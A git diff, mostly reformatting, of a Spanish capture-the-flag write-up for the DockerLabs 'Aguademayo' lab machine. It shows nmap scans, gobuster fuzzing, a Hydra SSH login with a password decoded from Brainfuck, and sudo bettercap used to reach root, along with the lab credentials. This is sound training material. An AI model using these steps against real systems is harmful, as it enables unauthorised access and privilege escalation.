@@ -2,23 +2,27 @@
 icon: linux
 ---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Aguademayo ​​
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Gobuster` `Hydra` `Brainfuck` `Sudoers` `Bettercap`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip aguademayo.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh aguademayo.tar
-``` 
+```
+
 Info:
 
 ```
@@ -43,23 +47,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 17:13 CEST
 Nmap scan report for 172.17.0.2
@@ -92,7 +97,7 @@ Al inspeccionar el código fuente, encontramos un comentario al final:
 
 se trata de un código escrito en `Brainfuck`, así que lo pasamos por un intérprete.
 
-![alt text](../../images/brain.png)
+![alt text](<../../.gitbook/assets/brain (1).png>)
 
 El resultado obtenido, al juntar todas las letras, es `bebeaguaqueessano`.
 
@@ -100,7 +105,7 @@ Probamos un ataque de `fuerza bruta` por `SSH` con el usuario `bebeaguaqueessano
 
 Es posible que `bebeaguaqueessano` sea una contraseña y no un usuario, así que continuamos buscando.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar recursos ocultos.
 
@@ -109,6 +114,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/d
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -139,6 +145,7 @@ hydra -l agua -p bebeaguaqueessano ssh://172.17.0.2
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -151,15 +158,16 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-12 17:40:
 
 Accedemos por SSH.
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for agua on 8b7d14fcd35a:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
@@ -176,6 +184,7 @@ sudo bettercap
 ```
 
 Info:
+
 ```
 bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]
 
@@ -196,6 +205,7 @@ Salimos de la interfaz y escalamos a `root` con el siguiente comando:
 ```
 
 Info:
+
 ```
 bash-5.2# whoami
 root
